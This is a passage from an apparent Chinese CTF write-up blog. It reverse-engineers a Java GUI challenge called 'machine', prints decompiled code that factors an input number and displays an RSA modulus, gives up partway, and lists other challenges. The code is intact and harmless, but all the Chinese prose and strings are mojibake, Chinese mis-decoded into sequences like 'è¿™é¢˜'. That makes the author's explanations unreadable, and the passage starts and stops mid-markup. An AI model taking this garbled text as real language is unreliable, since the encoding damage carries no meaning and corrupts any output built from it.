class="headerlink" title="machineï¼ˆä¸è®°å¾—é¢˜ç›®äº†"></a>machineï¼ˆä¸è®°å¾—é¢˜ç›®äº†</h3><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/image-20200422011349867.png" alt="GUI ç•Œé¢"></p><p>è¿™é¢˜æ˜¯ä¸ª Java å†™çš„åº”ç”¨ï¼Œæ‹¿å» Java Decompiler åç¼–è¯‘äº†ä¸€ä¸‹ï¼Œå¾—åˆ°ï¼š</p><p><img src="/2020/04/21/CTF_2020Ha1cyonCTF/image-20200422011720335.png" alt="åç¼–è¯‘ç»“æœ"></p><p>è™½ç„¶ä¹Ÿæ²¡å­¦è¿‡ Javaï¼Œä½†å¤§æ¦‚æ„æ€è¿˜æ˜¯èƒ½çœ‹ä¸ªå¤§æ¦‚çš„ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Gui</span>  <span class="token keyword">extends</span> <span class="token class-name">Frame</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token class-name">JFrame</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JFrame</span><span class="token punctuation">(</span><span class="token string">"gkd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    f<span class="token punctuation">.</span><span class="token function">setBounds</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">,</span> <span class="token number">450</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    f<span class="token punctuation">.</span><span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token class-name">Container</span> j <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">getContentPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">JButton</span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JButton</span><span class="token punctuation">(</span><span class="token string">"å¥¥é‡Œç»™"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token class-name">JTextField</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JTextField</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token class-name">JLabel</span> l <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JLabel</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">JLabel</span> saying <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JLabel</span><span class="token punctuation">(</span><span class="token string">"å›¢é•¿è¯´:180298505946947064650759"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token punctuation">.</span><span class="token function">addKeyListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">KeyListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">keyTyped</span><span class="token punctuation">(</span><span class="token class-name">KeyEvent</span> e<span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">int</span> c <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getKeyChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">&lt;</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>c <span class="token operator">&gt;</span> <span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          e<span class="token punctuation">.</span><span class="token function">consume</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">keyReleased</span><span class="token punctuation">(</span><span class="token class-name">KeyEvent</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">keyPressed</span><span class="token punctuation">(</span><span class="token class-name">KeyEvent</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c<span class="token punctuation">.</span><span class="token function">addActionListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ActionListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">actionPerformed</span><span class="token punctuation">(</span><span class="token class-name">ActionEvent</span> e<span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> u <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            u <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"100"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          u <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>u<span class="token punctuation">)</span>        <span class="token punctuation">{</span>          l<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"é€—çˆ·ç©å‘¢,ç»™çˆ·çˆªå·´,å†ç©ä¸‹å»å›¢é•¿å°±è¦å”±å¸Œæœ›ä¹‹èŠ±äº†"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token class-name">Lib</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Lib</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BigInteger</span> b <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        l<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"n="</span> <span class="token operator">+</span> b<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",e=65537"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        j<span class="token punctuation">.</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token punctuation">.</span><span class="token function">setBounds</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c<span class="token punctuation">.</span><span class="token function">setBounds</span><span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    l<span class="token punctuation">.</span><span class="token function">setBounds</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">260</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    saying<span class="token punctuation">.</span><span class="token function">setBounds</span><span class="token punctuation">(</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    j<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    j<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    j<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">;</span>    j<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>saying<span class="token punctuation">)</span><span class="token punctuation">;</span>    f<span class="token punctuation">.</span><span class="token function">setDefaultCloseOperation</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    f<span class="token punctuation">.</span><span class="token function">setVisible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>è¿™ä¸Šé¢çš„ä»£ç éƒ½æ˜¯æ§åˆ¶ GUI çš„ï¼Œç»™è¾“å…¥æ¡†ç»‘å®šäº†å‡½æ•°ï¼Œå¦‚æœä¸æ˜¯æ•°å­—ï¼ˆâ€™0â€™-â€˜9â€™ï¼‰çš„è¯å°±é”€æ¯ï¼ˆè¾“å…¥ä¸æ˜¾ç¤ºåœ¨æ¡†é‡Œï¼‰ã€‚</p><p>ç»™ button ç»‘å®šäº†æ‰§è¡Œå‡½æ•°ï¼Œé¦–å…ˆåˆ¤æ–­è¾“å…¥å­—ç¬¦æ˜¯ä¸æ˜¯æ•°å­—ï¼Œå†æ¯”è¾ƒè¾“å…¥çš„æ•°å­—æ˜¯å¦ &gt;100ï¼Œå¦‚æœéƒ½ä¸æˆç«‹å°±è¾“å‡º <code>é€—çˆ·ç©å‘¢,ç»™çˆ·çˆªå·´,å†ç©ä¸‹å»å›¢é•¿å°±è¦å”±å¸Œæœ›ä¹‹èŠ±äº†</code>ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Lib</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Lib</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">BigInteger</span> b <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>l<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"n="</span> <span class="token operator">+</span> b<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",e=65537"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>éƒ½æˆç«‹çš„è¯å†ç”¨è¾“å…¥çš„æ•°å­—å»å®ä¾‹åŒ– LIbï¼Œçœ‹ä¸Šé¢è¿™å‡ è¡Œæ„Ÿè§‰å°±æ˜¯ç®—å¤§æ•´æ•°näº†ï¼Œåˆæ˜¯ RSAï¼Ÿ</p><p>æŒ‰ç…§ä¸Šé¢çš„è§„åˆ™è¾“å…¥å‡ ä¸ªæ•°å­—è¯•äº†è¯•ï¼Œå‘ç°ç¨‹åºå¡æ­»ï¼Œç–¯ç‹‚å ç”¨ CPU çš„ä¸€ä¸ªæ ¸å¿ƒï¼ˆå•çº¿ç¨‹å‘¢ï¼‰è¿›è¡Œè¿ç®—ã€‚</p><p>æ˜¯åœ¨å¹²å˜›å™¢ï¼Œä¸‹é¢çœ‹çœ‹ Lib ç±»å§ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">machine</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span><span class="token class-name">BigInteger</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Stack</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Lib</span><span class="token punctuation">{</span>  <span class="token keyword">private</span> <span class="token class-name">BigInteger</span> b<span class="token punctuation">;</span>  <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BigInteger</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> m<span class="token punctuation">;</span>  <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token class-name">B</span> <span class="token operator">=</span> <span class="token number">150</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token class-name">BigInteger</span> <span class="token class-name">T</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">BigInteger</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">BigInteger</span> t1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">mod</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">divide</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">mod</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">divide</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">BigInteger</span><span class="token punctuation">.</span>ONE<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token class-name">BigInteger</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        d <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">BigInteger</span><span class="token punctuation">.</span>ONE<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">mod</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">BigInteger</span><span class="token punctuation">.</span>ZERO<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">divide</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">BigInteger</span> j <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> d<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">;</span> j<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">BigInteger</span><span class="token punctuation">.</span>ONE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>d<span class="token punctuation">.</span><span class="token function">mod</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">BigInteger</span><span class="token punctuation">.</span>ZERO<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            j <span class="token operator">=</span> j<span class="token punctuation">.</span><span class="token function">subtract</span><span class="token punctuation">(</span><span class="token class-name">BigInteger</span><span class="token punctuation">.</span>ONE<span class="token punctuation">)</span><span class="token punctuation">;</span>            d <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">divide</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">BigInteger</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BigInteger</span><span class="token punctuation">&gt;</span></span> p <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BigInteger</span><span class="token punctuation">&gt;</span></span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">BigInteger</span> d <span class="token operator">=</span> <span class="token class-name">BigInteger</span><span class="token punctuation">.</span>ONE<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">BigInteger</span> q <span class="token operator">:</span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span>      o<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    d <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">BigInteger</span><span class="token punctuation">)</span>o<span class="token punctuation">.</span><span class="token function">elementAt</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    d <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">BigInteger</span><span class="token punctuation">)</span>o<span class="token punctuation">.</span><span class="token function">elementAt</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> d<span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token class-name">Lib</span><span class="token punctuation">(</span><span class="token class-name">String</span> num<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>m <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">s</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>çœ‹æœ€ä¸‹é¢çš„å‡½æ•°ï¼Œé¦–å…ˆ b ä¸ºè¾“å…¥çš„æ•°å­—ï¼Œmä¸ºä¸€ä¸ª HashMapï¼ˆä¸æ˜¯å¾ˆæ‡‚ï¼Ÿ</p><p><code>f()</code>å‡½æ•°å…ˆæ˜¯ä¸æ–­è®© b/2 ç›´åˆ° b mod 2 == 0ï¼Œç„¶åæŠŠè¿™æ—¶çš„ 2 å’Œç´¢å¼• i æ”¾å…¥ mï¼›ä¹‹ååŒç†è®© b/3ï¼ŒæŠŠ 3 å’Œç´¢å¼• i æ”¾å…¥ mã€‚</p><p><code>s()</code>å‡½æ•°â€¦â€¦</p><p><em>ï¼ˆåšåˆ°è¿™é‡Œåé¢æœ‰äº‹å°±æ²¡çœ‹ä¸‹å»äº†</em></p><p>è¹²ä¸ªå¤§ä½¬çš„ WP çœ‹çœ‹ã€‚</p><br><hr><h2 id="å…¶ä»–é¢˜"><a href="#å…¶ä»–é¢˜" class="headerlink" title="å…¶ä»–é¢˜"></a>å…¶ä»–é¢˜</h2><p>è¿™æ¬¡è¿˜æœ‰æŒºå¤šæœ‰æ„æ€çš„é¢˜ç›®å§ã€‚</p><p>æ¯”å¦‚ Misc æœ‰é“ Minecraft çš„é¢˜ç›®ï¼Œçœ‹æˆªå›¾è¿˜æœ‰çº¢çŸ³ç”µè·¯çš„ï¼Œä¸è¿‡å€’æ˜¯æ²¡äººåšå‡ºæ¥ç½¢äº†ã€‚</p><p>Reverse é‡Œæœ‰ä¸ª <code>R_E_5_E_T.exe</code> æ˜¯ç”¨ VB å†™çš„ï¼Œç¥å™¨ IDA å°±ç›´æ¥ç”¨ä¸äº†äº†ï¼Œè²Œä¼¼è¿˜åŠ äº†å£³ï¼Œç»™äº†ä¸€å † hint ç„¶è€Œå¹¶ä¸ä¼šåšã€‚</p><p>æœ‰é“é¢˜ <code>are-you-a-fan</code> ç”¨äº†ä¸€å †ä½è¿ç®—ï¼Œhint æ˜¯ NANDï¼ˆæ•°ç”µé‡Œçš„ï¼Ÿï¼‰ï¼Œå“‡å‘œéš¾é¡¶ã€‚</p><p>Crypto é‡Œæœ‰ä¸ª <code>EzRSA</code>ï¼Œæ–‡ä»¶åæ˜¯ <code>difficultrsa.py</code>ï¼Œå™¢æš´éœ²çœŸç›¸äº†2333ã€‚</p><p>åˆ°æœ€åè¿˜å‡ºäº† OI 